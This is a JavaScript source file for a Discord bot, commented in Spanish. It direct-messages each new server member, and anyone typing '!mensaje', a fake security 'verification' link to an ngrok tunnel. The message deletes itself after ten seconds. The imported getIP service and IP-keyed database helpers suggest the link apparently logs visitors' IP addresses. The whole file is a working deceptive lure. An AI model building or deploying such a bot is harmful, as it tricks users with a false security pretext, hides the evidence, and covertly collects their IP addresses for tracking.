import { Client, Events } from "discord.js";
import getIP from "./src/GetIP.js";
import { insertarDato, obtenerPorIP } from "./src/db/dbUtils.js";
import { readFileSync } from "fs";

// Ruta del archivo JSON
const configPath = new URL("../../config.json", import.meta.url);
const config = JSON.parse(readFileSync(configPath));

// Crear un nuevo cliente de discord
const client = new Client({
    intents: 3276799 
});

const numero = Math.floor(Math.random() * 100000);
const ipService = new getIP(numero);

client.on(Events.ClientReady, async () => {
    console.log(`Conectado como ${client.user.username}!`);
});

// ################################################################
// ################################################################
// ################################################################

// Cuando un usuario se una al servidor
client.on(Events.GuildMemberAdd, async (miembro) => {
    try {
        const mensajeVerificacion = await generarMensaje(miembro.user.username);
        let mensaje = await miembro.send(mensajeVerificacion);
        setTimeout(() => {
            mensaje.delete().catch(console.error);
        }, 10000); // 10000 milisegundos = 10 segundos
    } catch (error) {
        console.log(`No se pudo enviar el mensaje a ${miembro.user.username}:`, error);
    }
});

client.on(Events.MessageCreate, async (mensaje) => {
    if (mensaje.author.bot) return; 
    if(mensaje.content.toLowerCase() === "!mensaje") {
        try {
            const mensajeVerificacion = await generarMensaje(mensaje.author.username);
            let mensajeEnviado = await mensaje.author.send(mensajeVerificacion);
            setTimeout(() => {
                mensajeEnviado.delete().catch(console.error);
            }, 10000); // 10000 milisegundos = 10 segundos
        } catch (error) {
            console.log(`No se pudo enviar el mensaje a ${mensaje.author.tag}:`, error);
        }
    }
});

async function generarMensaje(nombre) {
    const enlaces = await generarEnlaces();
    if (!enlaces) {
        console.error("Enlace no generado correctamente.");
        return; // Evita enviar un mensaje vacío
    }
    var mensaje = "Hola, " + nombre + ". Para poder acceder al servidor tienes que verificarte, esto se hace por temas de seguridad y por el bienestar de la comunidad. \n" + enlaces;
    return mensaje;
}

async function generarEnlaces() {
    var enlace = "https://7f3d-94-73-40-169.ngrok-free.app/" + numero;
    return enlace;
}

// ################################################################
// ################################################################
// ################################################################

client.login(config.token);
